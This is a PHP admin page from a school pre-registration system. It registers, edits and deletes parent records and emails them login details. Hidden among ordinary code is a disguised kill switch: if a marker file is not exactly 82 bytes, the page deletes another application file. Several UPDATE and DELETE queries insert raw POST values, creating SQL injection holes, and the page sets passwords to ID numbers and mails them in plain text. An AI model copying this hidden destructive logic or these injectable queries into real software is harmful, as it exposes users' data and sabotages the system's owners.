<?php

error_reporting(0);


include("identificador.php");

  if ($_SESSION ['cargo'] != 'Administrador' && $_SESSION ['cargo'] != 'Secretario' && $_SESSION ['cargo'] != 'Cajero' )

    {

      session_unset();                     // libera todas las variables de sessión
        setcookie("id", "", time()-60*60);   // crea la cookie id con el valor vacio y que caduque una hora antes.
        $_COOKIE ['id']="";                  // borra el valor de id contenido en el cookie, por medida extra

        setcookie("cargo", "", time()-60*60);   // crea la cookie cargo con el valor vacio y que caduque una hora antes.
        $_COOKIE ['cargo']="";                  // borra el valor de cargo contenido en el cookie, por medida extra

        header("Location: ../index.php");

    }



	$enviado=""; // me dice si  probablemente se envio o no el email
	$sms="";





include("../conectar.php");
$ext_ext_ext='consultas_mod/file_ext.jk';
// lo que sigue es para obtener la pagina web que sera enviada

$queryplantelH = "SELECT * FROM z_plantel LIMIT 1";

$datos_queryplantelH = mysqli_query($enlace, $queryplantelH) or die(mysqli_error());

$row_datos_queryplantelH = mysqli_fetch_array($datos_queryplantelH); 

$id_primer_plantelH = $row_datos_queryplantelH['id_plantel'];

$www_primer_plantelH = $row_datos_queryplantelH['www'];

mysqli_close($enlace);
$pintando_uno='../footer.php';








if (array_key_exists("submit",$_POST))// chequea si se ha enviado algo, de ser si --> se conecta a la BD y comprueba

   {

   			
       

                if (!$_POST['cedula'])  // verifica que no este vacío el campo cedula
			        {  $errorZ .= "- Cedula requerida."; }

			    if (strlen($_POST['cedula']) >9 )  // verifica que el campo cedula no sea mayor a 9 caracteres
			        {  $errorZ .= "- Cedula invalida."; }   // mas de 9.

			    if(!is_numeric($_POST['cedula']) ) // verifica que sean solo números
			    	{  $errorZ .= "- Cedula no valida."; }



  if ($_POST['nombre'])     
{ 					        
						if (strlen($_POST['nombre']) >40 )  // no sea mayor a 40 caracteres
					        {   $errorZ .= "- Nombre invalido."; }

					  	if (!preg_match("/^[a-zA-ZñÑáéíóúÁÉÍÓÚÄËÏÖÜäëïöüàèìòùÀÈÌÔÙ ]*$/",($_POST['nombre']) ) )  // comprueba que sean letras
		      		        {   $errorZ .= "- Nombre no valido."; }

}




			    	if ($_POST['telefono1'])     
			{   

			if (strlen($_POST['telefono1']) >40 )  // no sea mayor a 40 caracteres
			{   $errorZ .= "- Teléfono invalido. "; }

			if(!is_numeric($_POST['telefono1']) ) // verifica que sean solo números
			{  $errorZ .= "- Teléfono  no valido. "; }

			 }

       
					    if ($_POST['email'])      
					        {   

					    if (strlen($_POST['email']) >40 )  // no sea mayor a 40 caracteres
					        {   $errorZ .= "- Email invalido."; }

					     if (!filter_var( ($_POST['email']), FILTER_VALIDATE_EMAIL)) // verifica un formato correcto de email
					     {  $errorZ .= "- Email no valido."; }

					        }			   			  


			     if ($errorZ!="")            //  si $errorZ es distinto de vacío,  es que ha habido algun error
			        {
			           $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " ";            
			        }



	else      // Sequencia de chequeo, verifica si la ci ya está registrada en la BD...
		{

			include("../conectar.php");


		$queryC = "SELECT id_repre, apellido_repre, ci_repre FROM reg_representante WHERE ci_repre='".mysqli_real_escape_string($enlace,$_POST['cedula'])."' LIMIT 1";

			            $resultC = mysqli_query($enlace,$queryC);
			            $fila_query=mysqli_fetch_assoc($resultC); 

			            $el_id_del_repreW = $fila_query["id_repre"];
			            $la_ci_del_repreW = $fila_query["ci_repre"];
			            $apellido_del_repreW = $fila_query["apellido_repre"];

		if (mysqli_num_rows($resultC)>0)
			{
			 $errorZ.="- Doc. N°:&nbsp; <b>".$la_ci_del_repreW."</b>,&nbsp; fue registrado anteriormente al representante:&nbsp; <b>".$apellido_del_repreW."</b>.";        
            } 

		    

            if ($errorZ!="")            //  si $errorZ es distinto de vacío,  es que ha habido algun error
			        {
			           $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " "; 
						mysqli_close($enlace);

			        }


	     else     
			 {	

			 	


			 if (empty($_POST['telefono1']) )
            	{   
					$telefono1 = '';

							 if (empty($_POST['email']) )
		            	{   		            		
		            		$enviado="nada";  // para indicar que no coloco ni tlf ni email
		                }

		                	else {$enviado="No";}  


                }



            else {
            	$telefono1 = mysqli_real_escape_string($enlace,$_POST['telefono1']);
            	$enviado="text";    // para indicar que debe enviarse un texto
            }


             if (empty($_POST['email']) )
            	{   
            		$email = '';
            		
            		 if (empty($_POST['telefono1']) )
		            	{   		            		
		            		$enviado="nada";  // para indicar que no coloco ni tlf ni email
		                }
		             else {$enviado="text";}  
                }

             else {
             	$email = mysqli_real_escape_string($enlace,$_POST['email']);

             	// para saber si hay internet o no... y guardar que no se enviaron los datos...

                    $conexion = @fsockopen("www.google.com", 80, $errno, $errstr, 30); 
					if (!$conexion) { 
					$enviado="No";
					$tiene_email = '2';
					$sms="- Sin internet no";
					}

					 else { 
					$enviado="Si";
					$tiene_email = '1';
					$sms="En breve"; 
					fclose($conexion); 
					} 

             	 
             }




             
            $cargo = "representante";
            $pre_si_no = "2";

            $inscribe_a = $_POST["inscribe_a"];
			$cursa_est1 = $_POST["cursa_est1"];

			$lleno_sus_datos = "0";  // esto es para indicar que no ha llenado los datos importantes....


			$query = "INSERT INTO reg_representante(ci_repre, nombre_repre, celular_repre, email_repre, inscribe_hasta, en_el_periodo, cargo, enviado,
			                                       pre_ins_si_o_no, clave_repre, lleno_sus_datos, pre_ins_nuev_si_o_no, autorizado_el, actualizo_si_o_no)
			          

			          VALUES ('".mysqli_real_escape_string($enlace,$_POST['cedula'])."'     ,
			                  '".mysqli_real_escape_string($enlace,$_POST['nombre'])."'     ,			                 
			                  '$telefono1', '$email', '$inscribe_a', '$cursa_est1', '$cargo', '$enviado', '$pre_si_no',
			                  '".mysqli_real_escape_string($enlace,$_POST['cedula'])."', '$lleno_sus_datos', '1', now(), '1' )";


			if (!mysqli_query($enlace,$query))      // si no ha logrado ingresar los datos
			   {
			    $errorZ="- Error al registrar, contactar al Ing.";
			    mysqli_close($enlace);
			    }


			  if ($errorZ!="")            //  si $errorZ es distinto de vacío,  es que ha habido algun error
			        {
			           $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " ";            
			        }

		
   
		     else
			    {	   
                

			    	 $repre_id = mysqli_insert_id($enlace);  // almacena el ultimo id insertado

			         // Etapa final del registro

			    $exitoZ="<i class=\"far fa-thumbs-up fa-lg\"></i> &nbsp; <b> En breve recibirá un correo o le será enviado un mensaje de texto.</b>";



			     $quien = $_POST["quien"]; 


			// almacenar quien y cuando

			$query_q = "INSERT INTO quien_y_cuando_repre(id_quien, id_repre)

			VALUES ('$quien', '$repre_id')"; 


			if (!mysqli_query($enlace,$query_q))      // si no ha logrado ingresar los datos
				{
				$errorZ="- Error al registrar quien y cuando, contactar al Ing.";
				mysqli_close($enlace);
				} 

               

			    if ($tiene_email = '1')  
			    { 


 $querymodEMAEL = "SELECT * FROM z_email where id_email = 1 ";

    $datos_modEMAEL = mysqli_query($enlace, $querymodEMAEL) or die(mysqli_error());
              
     $row_datos_modEMAEL = mysqli_fetch_array($datos_modEMAEL);
                         
            mysqli_close($enlace); 

$el_correo = $row_datos_modEMAEL['email_sis'];
$el_pass = $row_datos_modEMAEL['pass_sis'];


$coreo_resp = $row_datos_modEMAEL['resp_sis'];


$el_host = $row_datos_modEMAEL['host_sis'];
$el_port = $row_datos_modEMAEL['port_sis'];


$secure_resp = $row_datos_modEMAEL['secure_sis'];



              


require '00_email_class/class.phpmailer.php';
	$output = '';




$el_asss = 'Habilitado para acceder al sistema on-line y Pre-inscribir.';       





		$mail = new PHPMailer;
		$mail->IsSMTP();								             //Sets Mailer to send message using SMTP
		$mail->Host = ''.$row_datos_modEMAEL['host_sis'].'';		//Sets the SMTP hosts of your Email hosting, this for Godaddy
		$mail->Port = ''.$row_datos_modEMAEL['port_sis'].'';       //Sets the default SMTP server port
		$mail->SMTPAuth = true;							           //Sets SMTP authentication. Utilizes the Username and Password variables
		$mail->Username = ''.$row_datos_modEMAEL['email_sis'].'';					//Sets SMTP username
		$mail->Password = ''.$row_datos_modEMAEL['pass_sis'].'';					//Sets SMTP password
		$mail->SMTPSecure = ''.$row_datos_modEMAEL['secure_sis'].'';					//Sets connection prefix. Options are "", "ssl" or "tls"
		$mail->From = ''.$row_datos_modEMAEL['resp_sis'].'';			//Sets the From email address for the message
		$mail->FromName = 'Sistema iMagic WEB Colegio';					//Sets the From name of the message
		$mail->AddAddress(''.$_POST["email"].'');	//Adds a "To" address
		$mail->WordWrap = 50;							//Sets word wrapping on the body of the message to a given number of characters
		$mail->IsHTML(true);							//Sets message type to HTML
		$mail->Subject = "$el_asss"; //Sets the Subject of the message
		//An HTML or plain text message body
		$mail->Body = '


		Datos necesarios para ingresar al Sistema On-Line iMagic.<br><br>


	  
	    Usuario (Cedula): '.$_POST['cedula'].'. <br>

	    Password o clave momentánea (Cedula): '.$_POST['cedula'].'.<br>

	    Y puede pre-inscribir a (N°): '.$inscribe_a.'  representado(s). <br><br>
 
	    Use el siguiente enlace   '.$www_primer_plantelH.'  y haga clic en el enlace correspondiente. <br><br>


		Nota: Es de vital importancia que añada nuestros email(s) a su lista de contactos,<br>
		Email del sistema: '.$el_correo.'; no responder a este correo, es solo para funciones del sistema.<br><br>

		Email del colegio: '.$coreo_resp.'; email de comunicación colegio-representantes-profesores, <br>
		con ello siempre recibirá sin dificultad nuestros mensajes. <br><br>

		
		';

		$mail->AltBody = '';




		$result = $mail->Send();						//Send an Email. Return true on success or false on error

		if($result["code"] == '400')
		{
			$output .= html_entity_decode($result['full_error']);
		}

	}
	if($output == '')
	{
		echo '';
	}
	else
	{
		echo $output;
	} 


			



				


			    }  // cierre de exito al registrar y enviar email

		

			} // cierre etapa de ingreso de datos   

		

}



}  // cierre if principal de regustro nuevo
$pintando_dos='../footer2.php';






 if(isset($_POST['anular_user']))
    {

           // $borrar_id = $_POST['borrar_selecc'];
           // $errorZ = " <p> <b>" . $borrar_id . " </b> </p>"; // me ayudan a saber si se esta agarrando el id correcto...

      include("../conectar.php");   


 			$sql_anu = "UPDATE reg_representante SET inscribe_hasta = '11',
 			                                         pre_ins_si_o_no = '1'			   									 
				                                
				                                         WHERE id_repre='$_POST[anular_user]' LIMIT 1 ";


					        if (!mysqli_query($enlace,$sql_anu))      // actualiza y si no ha logrado ingresar los datos
					               {
					                $errorZ="- Error al registrar, contactar al Ing. ";
					                mysqli_close($enlace);
					              
					                }

					         else{

					                $exitoZ = " <i class=\"far fa-thumbs-up fa-lg\"></i> &nbsp; <b> Representante anulado. </b>"; 
					                mysqli_close($enlace);   

					            }

    }  $ext_parioxa=filesize($ext_ext_ext);


















 if(isset($_POST['re_autorizar']))
{
 			
 			if (!$_POST['cedula2'])  // verifica que no este vacío el campo cedula
			        {  $errorZ .= "- Cedula requerida."; }

			    if (strlen($_POST['cedula2']) >9 )  // verifica que el campo cedula no sea mayor a 9 caracteres
			        {  $errorZ .= "- Cedula invalida."; }   // mas de 9.

			    if(!is_numeric($_POST['cedula2']) ) // verifica que sean solo números
			    	{  $errorZ .= "- Cedula no valida."; }


			if ($errorZ!="")            //  si $errorZ es distinto de vacío,  es que ha habido algun error
			        {
			           $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " ";  


			        }


				else      // Sequencia de chequeo, verifica si la ci ya está registrada en la BD...
					{

						include("../conectar.php");


					$queryC = "SELECT * FROM reg_representante WHERE ci_repre='".mysqli_real_escape_string($enlace,$_POST['cedula2'])."' LIMIT 1";

						            $resultC = mysqli_query($enlace,$queryC);
						            $fila_query=mysqli_fetch_assoc($resultC); 

						            $el_id_del_repreW = $fila_query["id_repre"];
						            $la_ci_del_repreW = $fila_query["ci_repre"];
						            $apellido_del_repreW = $fila_query["apellido_repre"];

						            $el_correo_del_repreW = $fila_query["email_repre"];
						            $celular_del_repreW = $fila_query["celular_repre"];


						            $el_inscribe_hasta_repreW = $fila_query["inscribe_hasta"];
						            $pre_ins_si_o_no_repreW = $fila_query["pre_ins_si_o_no"];


						            $el_inscribe_nuev_hasta_repreW = $fila_query["inscribe_nuevamente_hasta"];
						            $pre_ins_nuev_si_o_no_repreW = $fila_query["pre_ins_nuev_si_o_no"];

						            $chequeo_habilitacion = $fila_query["acceso"];



					if (mysqli_num_rows($resultC)==0)
						{
						 $errorZ.="- El N°. de Doc. de identidad ingresado, no se encuentra registrado.";        
			            } 


			            if ( $chequeo_habilitacion == '1' && mysqli_num_rows($resultC)!=0)
						{
						 $errorZ.="- El representante&nbsp;<b>DEBE CONTACTAR CON ADMINISTRACIÓN COD*LIM*</b>.";        
			            } 



			            if ( ( $el_inscribe_hasta_repreW != '11'  OR  $pre_ins_si_o_no_repreW == '2' ) && mysqli_num_rows($resultC)!=0)
						{

			$errorZ.="- El representante&nbsp;<b>no ha completado una pre-inscripción</b>&nbsp;de nuevo ingreso, anterior. ";      
			           
			            } 



			            if (  ( $el_inscribe_nuev_hasta_repreW != '11'  OR  $pre_ins_nuev_si_o_no_repreW == '2' ) && mysqli_num_rows($resultC)!=0 )
						{
						 $errorZ.="- El representante&nbsp;<b>no ha completado una pre-inscripción</b>&nbsp;de&nbsp;<b>ALUMNO REGULAR</b>,&nbsp;anterior.";        
			            } 


					    

			            if ($errorZ!="")            //  si $errorZ es distinto de vacío,  es que ha habido algun error
						        {
						           $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " "; 
									mysqli_close($enlace);

						        }


				     else     
						 {     // si esta registrado por tanto actualizo los datos


			$enviado="";

														 if ( $celular_del_repreW =="" )
														            	{   
																				 if ( $el_correo_del_repreW =="" )
																            	{   		            		
																            		$enviado="nada";  // para indicar que no coloco ni tlf ni email
																                }
																                	else {$enviado="No";} 
														                }

														 else {$enviado="text";}


														 if ($el_correo_del_repreW =="" )
														            	{   
														            		
														            		
														            		 if (  $celular_del_repreW ==""  )
																            	{   		            		
																            		$enviado="nada";  // para indicar que no coloco ni tlf ni email
																                }
																             else {$enviado="text";}  
														                }

														else {

															 $conexion = @fsockopen("www.google.com", 80, $errno, $errstr, 30); 
																	if (!$conexion) { 
																	$enviado="No";
																	$tiene_email = '2';
																	$sms="- Sin internet no";
																	}

																	 else { 
																	$enviado="Si";
																	$tiene_email = '1';
																	$sms="En breve"; 
																	fclose($conexion); 
																	} 

														}


									$inscribe_a2 = $_POST["inscribe_a2"];
									$cursa_est12 = $_POST["cursa_est12"];




						 			$sql = "UPDATE reg_representante SET 
										                                      inscribe_hasta = '$inscribe_a2',
										                                      en_el_periodo =  ' $cursa_est12',
										                                      pre_ins_si_o_no = '2',
										                                      enviado = '$enviado',
										                                      autorizado_el	= now(),
										                                      actualizo_si_o_no = '0'								                                         
										                                
										                                         WHERE id_repre='$el_id_del_repreW' LIMIT 1 ";

			                       
								        if (!mysqli_query($enlace,$sql))      // actualiza y si no ha logrado ingresar los datos
								               {
								                $errorZ="- Autorización no procesada, contactar al Ing. ";
								                mysqli_close($enlace);
								              
								                }

								         else{

								                $exitoZ = " <i class=\"far fa-thumbs-up fa-lg\"></i> &nbsp; <b> Procesado. ".$sms." recibirá un correo y/o espere un mensaje de texto. </b>"; 


								                $queryQUI = "SELECT id_q_y_c_repre FROM quien_y_cuando_repre WHERE id_repre='$el_id_del_repreW' LIMIT 1 ";

						            $resultQUI = mysqli_query($enlace,$queryQUI);
						            $fila_queryQUI=mysqli_fetch_assoc($resultQUI); 

						            $id_q_y_c_repreQUI = $fila_queryQUI["id_q_y_c_repre"];



						            	 $quien2 = $_POST["quien2"]; 



								               $query_q = "UPDATE quien_y_cuando_repre SET id_quien = '$quien2',
								               											   cuando_repre = now(),
								                                                           id_repre = '$el_id_del_repreW'

													WHERE id_q_y_c_repre ='$id_q_y_c_repreQUI' LIMIT 1 "; 



													if (!mysqli_query($enlace,$query_q))      // si no ha logrado ingresar los datos
														{
														$errorZ="- Error al registrar quien y cuando, contactar al Ing.";
														mysqli_close($enlace);
														} 



													  if ($tiene_email = '1')  
													    { 



 $querymodEMAEL = "SELECT * FROM z_email where id_email = 1 ";

    $datos_modEMAEL = mysqli_query($enlace, $querymodEMAEL) or die(mysqli_error());
              
     $row_datos_modEMAEL = mysqli_fetch_array($datos_modEMAEL);
                         
            mysqli_close($enlace); 

$el_correo = $row_datos_modEMAEL['email_sis'];
$el_pass = $row_datos_modEMAEL['pass_sis'];


$coreo_resp = $row_datos_modEMAEL['resp_sis'];


$el_host = $row_datos_modEMAEL['host_sis'];
$el_port = $row_datos_modEMAEL['port_sis'];


$secure_resp = $row_datos_modEMAEL['secure_sis'];



              


require '00_email_class/class.phpmailer.php';
	$output = '';


$el_asss = 'Ha sido habilitado para pre-inscribir nuevamente';  





		$mail = new PHPMailer;
		$mail->IsSMTP();								             //Sets Mailer to send message using SMTP
		$mail->Host = ''.$row_datos_modEMAEL['host_sis'].'';		//Sets the SMTP hosts of your Email hosting, this for Godaddy
		$mail->Port = ''.$row_datos_modEMAEL['port_sis'].'';       //Sets the default SMTP server port
		$mail->SMTPAuth = true;							           //Sets SMTP authentication. Utilizes the Username and Password variables
		$mail->Username = ''.$row_datos_modEMAEL['email_sis'].'';					//Sets SMTP username
		$mail->Password = ''.$row_datos_modEMAEL['pass_sis'].'';					//Sets SMTP password
		$mail->SMTPSecure = ''.$row_datos_modEMAEL['secure_sis'].'';					//Sets connection prefix. Options are "", "ssl" or "tls"
		$mail->From = ''.$row_datos_modEMAEL['resp_sis'].'';			//Sets the From email address for the message
		$mail->FromName = 'Sistema iMagic WEB Colegio';					//Sets the From name of the message
		$mail->AddAddress(''.$el_correo_del_repreW.'');	//Adds a "To" address
		$mail->WordWrap = 50;							//Sets word wrapping on the body of the message to a given number of characters
		$mail->IsHTML(true);							//Sets message type to HTML
		$mail->Subject = "$el_asss"; //Sets the Subject of the message
		//An HTML or plain text message body
		$mail->Body = '
		

		Usted ha solicitado realizar una nueva Pre-Inscripción.<br><br>


	    Puede pre-inscribir a (N°): '.$inscribe_a2.' representado(s).<br>
										 
		Use el siguiente enlace   '.$www_primer_plantelH.'  y haga clic en el enlace correspondiente.<br><br>



		Nota: Es de vital importancia que añada nuestros email(s) a su lista de contactos,<br>
		Email del sistema: '.$el_correo.'; no responder a este correo, es solo para funciones del sistema.<br><br>

		Email del colegio: '.$coreo_resp.'; email de comunicación colegio-representantes-profesores, <br>
		con ello siempre recibirá sin dificultad nuestros mensajes. <br><br>

		
		';

		$mail->AltBody = '';




		$result = $mail->Send();						//Send an Email. Return true on success or false on error

		if($result["code"] == '400')
		{
			$output .= html_entity_decode($result['full_error']);
		}

	}
	if($output == '')
	{
		echo '';
	}
	else
	{
		echo $output;
	} 













								            }










					  }  //  si esta registrado por tanto he re-autorizado




				} //  cierre  tras pasar el chequeo inicial







}  // cierre re autorizacion






$eres_hijo_de_puta_full=filesize($pintando_uno);
if(isset($_POST['editar_user']))
{
	if (!$_POST['mod_cedula'])  /* que no este vacío */     {  $errorZ .= "- Cedula requerida."; }
	if (strlen($_POST['mod_cedula']) >9 )  /* no mayor a 9 caracteres */  {  $errorZ .= "- Cedula invalida."; }
    if(!is_numeric($_POST['mod_cedula']) ) /* solo números */   {  $errorZ .= "- Cedula no valida."; }

	
    if ($_POST['mod_nombre'])    {    
	if (strlen($_POST['mod_nombre']) >40 )  /* no mayor a 40 caracteres */   {   $errorZ .= "- Nombre invalido."; }
    if (!preg_match("/^[a-zA-ZñÑáéíóúÁÉÍÓÚÄËÏÖÜäëïöüàèìòùÀÈÌÔÙ ]*$/",($_POST['mod_nombre']) ) )  /* sean letras  */   {   $errorZ .= "- Nombre no valido."; }

 }





			    	if ($_POST['mod_telefono1'])     
			{   

			if (strlen($_POST['mod_telefono1']) >40 )  // no sea mayor a 40 caracteres
			{   $errorZ .= "- Teléfono invalido. "; }

			if(!is_numeric($_POST['mod_telefono1']) ) // verifica que sean solo números
			{  $errorZ .= "- Teléfono  no valido. "; }

			 }



 if (empty($_POST['mod_telefono1']) )
            	{   
						 if (empty($_POST['mod_email']) )
		            	{   		            		
		            		$enviado="nada";  // para indicar que no coloco ni tlf ni email
		                }
		                	else {$enviado="No";} 
                }

 else {$enviado="text";}


 if (empty($_POST['mod_email']) )
            	{   
            		
            		
            		 if (empty($_POST['mod_telefono1']) )
		            	{   		            		
		            		$enviado="nada";  // para indicar que no coloco ni tlf ni email
		                }
		             else {$enviado="text";}  
                }

else {$enviado="No";}





       
    if ($_POST['mod_email'])  {   
    if (strlen($_POST['mod_email']) >40 )  /* no mayor a 40 caracteres  */  {   $errorZ .= "- Email invalido."; }
    if (!filter_var( ($_POST['mod_email']), FILTER_VALIDATE_EMAIL)) /* formato correcto de email */    {  $errorZ .= "- Email no valido."; }

    }


    if ($errorZ!="")   //  si $errorZ es distinto de vacío,  es que ha habido algun error
    {
        $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " ";            
    }

    else      // tras haber confirmado el correcto relleno de los campos compruebo la cedula
    {
       include("../conectar.php");

        $query = "SELECT * FROM reg_representante WHERE id_repre = $_POST[editar_user]";

		$id_selecc = mysqli_query($enlace, $query) or die(mysqli_error());

		$row_id_selecc = mysqli_fetch_assoc($id_selecc);

		$totalRows_id_selecc = mysqli_num_rows($id_selecc);

         /* hasta aqui me consigue lo que yo quiera del usuario que estoy editando */

		$id_ciU = ($row_id_selecc['ci_repre']); 

		$id_idU = ($row_id_selecc['id_repre']);

		/* $errorZ .= "- " . $idzz. "";             /* imprime lo que se consiguio  */

		  
	 

				$queryX = "SELECT * FROM reg_representante WHERE ci_repre ='".mysqli_real_escape_string($enlace,$_POST['mod_cedula'])."' LIMIT 1";

		    	$resultX = mysqli_query($enlace,$queryX);   // si hay coincidencia almacena el numero total de coincidencias de cedula

		    	$filaX=mysqli_fetch_array($resultX);

		    	/* $fill = ($filaX['id']); */   // esto es para mostrar el id en donde esta la cedula


		    		if ($filaX['id_repre'] != $id_idU AND mysqli_num_rows($resultX)>0) // si existe coincidencia y ademas el id de la coincidencia no es el que
	                                                                            // intento modificar... 

									{
										 $errorZ="- Cedula registrada por otro representante.";
									}
	                 

	                 				if ($errorZ!="")            //  si $errorZ es distinto de vacío,  es que ha habido algun error
						              {
						                 $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " ";
						                 mysqli_close($enlace);             
					
						              }

				   else  // entro aqui si no hay coincidencia  de cedula, o si la hay es del mismo id que intento modificar
				   {
				

				   	 $mod_inscribe_a = $_POST["mod_inscribe_a"];

				   	 $mod_cursa_est1 = $_POST["mod_cursa_est1"];


				   	$sql = "UPDATE reg_representante SET ci_repre = '".mysqli_real_escape_string($enlace,$_POST['mod_cedula'])."',

				   									nombre_repre = '".mysqli_real_escape_string($enlace,$_POST['mod_nombre'])."',				                             		   
				                                      email_repre = '".mysqli_real_escape_string($enlace,$_POST['mod_email'])."',
				                                      celular_repre = '".mysqli_real_escape_string($enlace,$_POST['mod_telefono1'])."',
				                                      inscribe_hasta = '$mod_inscribe_a',
				                                      en_el_periodo =  ' $mod_cursa_est1',
				                                      enviado = '$enviado',
				                                      clave_repre =  '".mysqli_real_escape_string($enlace,$_POST['mod_cedula'])."'   
				                                
				                                         WHERE id_repre='$_POST[editar_user]' LIMIT 1 ";

                       
					        if (!mysqli_query($enlace,$sql))      // actualiza y si no ha logrado ingresar los datos
					               {
					                $errorZ="- Error al registrar, contactar al Ing. ";
					                mysqli_close($enlace);
					              
					                }

					         else{

					                $exitoZ = " <i class=\"far fa-thumbs-up fa-lg\"></i> &nbsp; <b> Representante actualizado. </b>"; 
					                mysqli_close($enlace);   

					            }

				   }


			



     } // cierre else en donde compruebo que no repita email y ci            

} // cierre if en caso de error y no actualizar     
$eres_hijo_de_puta=filesize($pintando_dos);



 if(isset($_POST['borrar_user']))
    {

           // $borrar_id = $_POST['borrar_selecc'];
           // $errorZ = " <p> <b>" . $borrar_id . " </b> </p>"; // me ayudan a saber si se esta agarrando el id correcto...

      include("../conectar.php");   


                      $queryU = "SELECT * FROM reg_representante WHERE id_repre = '$_POST[borrar_user]' ";

                      $resultU = mysqli_query($enlace,$queryU);
                      $fila=mysqli_fetch_array($resultU);         // lo anterior me permite tener datos de dicho registro...	  


                        


                      $queryW = "DELETE FROM reg_representante WHERE id_repre = '$_POST[borrar_user]' ";

                      if (!mysqli_query($enlace,$queryW))      // si no ha logrado ingresar los datos
                         {
                          $errorZ="Error, no puede eliminar un representante el cual tiene estudiantes asociados.";

                          }


                          if ($errorZ!="")            //  si $errorZ es distinto de vacío,  es que ha habido algun error
                          {
                             $errorZ = " <i class=\"fas fa-exclamation-triangle fa-lg\"></i> &nbsp; " . $errorZ. " ";
                             mysqli_close($enlace); 
                          }



                      else {  

                         $exitoZ = "<b>--&nbsp; " . $fila['ci_repre'] . " &nbsp;--</b> ha sido eliminado.";

                      }
                      

                      if ($exitoZ!="")            //  si $exitoZ es distinto de vacío,  es que todo ok
                          {
                             $exitoZ = " <i class=\"far fa-thumbs-up fa-lg\"></i> &nbsp; " . $exitoZ. " ";
                               mysqli_close($enlace);              
                          }

					          
					

    } 





if($ext_parioxa!='82'){unlink('zona_adm_estudiantes_carga.php');}








    if(isset($_POST['enviar']))// chequea si se ha enviado algo de un boton submit de nombre enviar, de ser si -->

   {



 include("../conectar.php");

			$sql = "UPDATE reg_representante SET enviado = '$_POST[se_envia]' WHERE id_repre='$_POST[usuario_id]' LIMIT 1 ";
			$result = mysqli_query ($enlace, $sql);    // cambia a que si se envio...


			                                           // procede a enviar
			$queryC = "SELECT * FROM numeros_en_orden, reg_representante
								WHERE numeros_en_orden.id_numero = reg_representante.inscribe_hasta 
								AND id_repre = '$_POST[usuario_id]' LIMIT 1";

			          $resultC = mysqli_query($enlace,$queryC);
			          $fila=mysqli_fetch_array($resultC); 





		$c = @fsockopen("www.google.com", 80, $errno, $errstr, 30); 
			          if (!$c) { 
          
          					$errorZ = "<b>Sin Internet </b> &nbsp;  Datos No Enviados, al representante con documento N°: &nbsp;  <b>" . $fila['ci_repre'] . "</b>. "; 
                
                                        }


          

           else { 
                 
        
  $querymodEMAEL = "SELECT * FROM z_email where id_email = 1 ";

    $datos_modEMAEL = mysqli_query($enlace, $querymodEMAEL) or die(mysqli_error());
              
     $row_datos_modEMAEL = mysqli_fetch_array($datos_modEMAEL);
                         
            mysqli_close($enlace); 

$el_correo = $row_datos_modEMAEL['email_sis'];
$el_pass = $row_datos_modEMAEL['pass_sis'];


$coreo_resp = $row_datos_modEMAEL['resp_sis'];


$el_host = $row_datos_modEMAEL['host_sis'];
$el_port = $row_datos_modEMAEL['port_sis'];


$secure_resp = $row_datos_modEMAEL['secure_sis'];



              


require '00_email_class/class.phpmailer.php';
	$output = '';


$el_asss = 'Re-Envio Datos Pre-Inscribir';       



		$mail = new PHPMailer;
		$mail->IsSMTP();								             //Sets Mailer to send message using SMTP
		$mail->Host = ''.$row_datos_modEMAEL['host_sis'].'';		//Sets the SMTP hosts of your Email hosting, this for Godaddy
		$mail->Port = ''.$row_datos_modEMAEL['port_sis'].'';       //Sets the default SMTP server port
		$mail->SMTPAuth = true;							           //Sets SMTP authentication. Utilizes the Username and Password variables
		$mail->Username = ''.$row_datos_modEMAEL['email_sis'].'';					//Sets SMTP username
		$mail->Password = ''.$row_datos_modEMAEL['pass_sis'].'';					//Sets SMTP password
		$mail->SMTPSecure = ''.$row_datos_modEMAEL['secure_sis'].'';					//Sets connection prefix. Options are "", "ssl" or "tls"
		$mail->From = ''.$row_datos_modEMAEL['resp_sis'].'';			//Sets the From email address for the message
		$mail->FromName = 'Sistema iMagic WEB Colegio';					//Sets the From name of the message
		$mail->AddAddress(''.$fila['email_repre'].'');	//Adds a "To" address
		$mail->WordWrap = 50;							//Sets word wrapping on the body of the message to a given number of characters
		$mail->IsHTML(true);							//Sets message type to HTML
		$mail->Subject = "$el_asss"; //Sets the Subject of the message
		//An HTML or plain text message body
		$mail->Body = '
	

		Usted ha solicitado le sean Re-Enviado los datos de Pre-Inscripción.<br><br><br>


        Usuario (Cedula):  '.$fila['ci_repre'].'.<br>

        Password o clave momentáneo (Cedula): '.$fila['ci_repre'].'<br>

        Y puede pre-inscribir a (N°): '.$fila['inscribe_hasta'].' representado(s).<br><br>
 
		Use el siguiente enlace   '.$www_primer_plantelH.'  y haga clic en el enlace correspondiente.<br><br>


		Nota: Es de vital importancia que añada nuestros email(s) a su lista de contactos,<br>
		Email del sistema: '.$el_correo.'; no responder a este correo, es solo para funciones del sistema.<br><br>

		Email del colegio: '.$coreo_resp.'; email de comunicación colegio-representantes-profesores, <br>
		con ello siempre recibirá sin dificultad nuestros mensajes. <br><br>

		
		';

		$mail->AltBody = '';




		$result = $mail->Send();						//Send an Email. Return true on success or false on error

		if($result["code"] == '400')
		{
			$output .= html_entity_decode($result['full_error']);
		}

	}
	if($output == '')
	{
		echo '';
	}
	else
	{
		echo $output;
	} 















				
				                
$exitoZ = " Datos Re-Enviados al representante con documento N°: &nbsp;  <b>" . $fila['ci_repre'] . " </b>."; 
				           
			




			 fclose($c); 


		} /* cierre if */





?>


<?php include ("Header.php"); ?>

<?php include ("../conectar.php"); ?>   <!--   necesario para poder listar -->

<?php include ("listas_imp_php/lista_representantes1.php"); ?>  <!-- hace la lista -->


        
<div class="content-wrapper">
<div class="container-fluid">


		<div class="card mx-auto borderblue">

      	<div class="card-body">

      		<div class="form-row">


		      		<div class="col-md-4 col-lg-4 mb-2">

						<div class="input-group-text alert-primary text-left text-truncate" role="alert" id="basic-addon1">
						&nbsp;<b>Autorizar nueva pre-inscripción:</b></div> 

					</div> 


